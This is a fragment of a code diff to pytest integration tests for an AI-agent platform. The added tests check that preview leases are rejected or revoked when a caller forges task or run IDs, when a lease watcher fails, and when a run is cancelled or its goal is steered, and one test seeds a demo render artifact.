             monkeypatch.setenv("AIAGENT_PREVIEW_CAPABILITY_KEY", preview_cap_key.hex())
 
+            # R4-04: Forged caller task_id / run_id MUST be rejected by ToolGateway.dispatch_preview_debug!
+            from aiagent_domain.rpcwire import RpcError as _RpcError
+
+            with pytest.raises(_RpcError, match="PREVIEW_TASK_OR_RUN_MISMATCH"):
+                _run(
+                    gw.dispatch_preview_debug(
+                        tenant_id=tenant["tenantId"],
+                        owner_user_id=tenant["userId"],
+                        cycle_id=cycle_a,
+                        lease_id=lease_id,
+                        preview_token=token,
+                        target_port=srv_port,
+                        task_id=uuid7(),
+                        run_id=created_a["runId"],
+                        revoke_after=False,
+                    )
+                )
+
+            # R4-04: Watcher exception (e.g. DB error) during active execution MUST fail closed & cancel cell!
+            lease_det = broker.verify_lease_details(
+                tenant["tenantId"], tenant["userId"], lease_id, token, srv_port, expected_cycle_id=cycle_a
+            )
+            assert lease_det.task_id == created_a["taskId"] and lease_det.run_id == created_a["runId"]
+
+            def _exploding_watcher() -> bool:
+                raise RuntimeError("simulated DB outage during live preview watch")
+
+            with pytest.raises(ScopeDenied, match="PREVIEW_LEASE_REVOKED_OR_WATCHER_FAILED"):
+                _run(
+                    run_sandbox_cell_preview_debug_async(
+                        tenant_id=tenant["tenantId"],
+                        owner_user_id=tenant["userId"],
+                        task_id=lease_det.task_id,
+                        run_id=lease_det.run_id,
+                        lease=lease_det,
+                        target_url=f"http://127.0.0.1:{srv_port}/slow",
+                        sandbox_endpoint=sb_endpoint,
+                        sandbox_rpc_key=sb_rpc_key,
+                        preview_capability_key=preview_cap_key,
+                        lease_alive_check=_exploding_watcher,
+                    )
+                )
+
+            # R4-04: Run cancellation invalidates lease immediately!
+            with dbs["owner"].tx() as c:
+                c.execute(
+                    "UPDATE agent.runs SET cancel_requested=true WHERE tenant_id=%s AND id=%s",
+                    (tenant["tenantId"], created_a["runId"]),
+                )
+            with pytest.raises(ScopeDenied, match="PREVIEW_RUN_OR_CYCLE_INACTIVE"):
+                broker.verify_lease_details(
+                    tenant["tenantId"], tenant["userId"], lease_id, token, srv_port, expected_cycle_id=cycle_a
+                )
+            with dbs["owner"].tx() as c:
+                c.execute(
+                    "UPDATE agent.runs SET cancel_requested=false WHERE tenant_id=%s AND id=%s",
+                    (tenant["tenantId"], created_a["runId"]),
+                )
+
             r_dbg = client.post(
                 f"/v1/development/cycles/{cycle_a}/debug",
                 headers=headers,
@@ -1115,7 +1482,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
                     "previewToken": token,
                     "targetPort": srv_port,
                     "path": "/",
-                    "revokeAfter": True,
+                    "revokeAfter": False,
                 },
             )
             assert r_dbg.status_code == 201, r_dbg.text
@@ -1131,7 +1498,26 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
             assert escape_hits == [], f"Sandbox Cell browser worker escaped isolated netns: {escape_hits}"
             assert any("[mobile] horizontal overflow" in msg for msg in finding["layoutIssues"])
 
-            # Lease auto-revoked after debug -> observe fails 403
+            # R4-04: Steering the task (real API goal_revision bump) invalidates active preview lease immediately!
+            r_steer_prv = client.post(
+                f"/v1/tasks/{created_a['taskId']}/steer",
+                headers=headers,
+                json={"schemaVersion": "1.0", "goal": "updated preview goal", "expectedGoalRevision": "1"},
+            )
+            assert r_steer_prv.status_code == 200, r_steer_prv.text
+            with pytest.raises(ScopeDenied, match="STALE_GOAL_REVISION"):
+                broker.verify_lease_details(
+                    tenant["tenantId"], tenant["userId"], lease_id, token, srv_port, expected_cycle_id=cycle_a
+                )
+            # Revoke lease explicitly -> observe fails 403
+            assert (
+                client.post(
+                    f"/v1/development/previews/{lease_id}/commands",
+                    headers=headers,
+                    json={"action": "revoke"},
+                ).status_code
+                == 200
+            )
             assert (
                 client.post(
                     f"/v1/development/previews/{lease_id}/commands",
@@ -1143,8 +1529,7 @@ def test_phase7_preview_lease_browser_debugger_and_cdp_redaction(
     finally:
         _stop_async_service(tg_loop, tg_th)
         _stop_async_service(sb_loop, sb_th)
-        srv.shutdown()
-        srv.server_close()
+        _stop_async_service(prv_loop, prv_th)
         escape_srv.shutdown()
         escape_srv.server_close()
 
@@ -1771,7 +2156,7 @@ def test_phase7_web_ui_development_tab_playwright_e2e(dbs: dict[str, Database], 
         name="Seeded UI App",
         repository="org/ui-app",
     )
-    cycle_id, _, _, _, _ = _seed_code_ready_cycle(dbs, tenant, project_id="proj-ui-1", repository="org/ui-app")
+    cycle_id, _, created_ui, _, _ = _seed_code_ready_cycle(dbs, tenant, project_id="proj-ui-1", repository="org/ui-app")
     store.create_design_proposal(
         tenant_id=tenant["tenantId"],
         owner_user_id=tenant["userId"],
@@ -1792,7 +2177,11 @@ def test_phase7_web_ui_development_tab_playwright_e2e(dbs: dict[str, Database], 
             {"candidateId": "cand-c", "label": "Classic Pro", "fixtureRef": "fixture://v1", "summary": "Dense data UI"},
         ],
     )
-    # R3-08: Seed a real rendered Demo artifact for cand-b so Web UI Demo approval verifies against real artifact bytes
+    # R3-08 / R4-05: Seed a real raw Demo render artifact in agent.context_artifacts for cand-b
+    ui_render_bytes = b"<html><body>Studio Dark Rendered Preview</body></html>"
+    ui_src_art_id, _ = _seed_context_artifact(
+        dbs, tenant, task_id=created_ui["taskId"], run_id=created_ui["runId"], raw_bytes=ui_render_bytes, kind="raw"
+    )
     store.record_demo_render_artifact(
         tenant_id=tenant["tenantId"],
         owner_user_id=tenant["userId"],
@@ -1800,7 +2189,8 @@ def test_phase7_web_ui_development_tab_playwright_e2e(dbs: dict[str, Database], 
         candidate_id="cand-b",
         viewport="1280x800",
         fixture_ref="fixture://v1",
-        render_bytes=b"<html><body>Studio Dark Rendered Preview</body></html>",
+        source_artifact_id=ui_src_art_id,
+        render_bytes=ui_render_bytes,
     )
 
     app = create_app(dbs["api"], web_dist_dir=dist_dir)
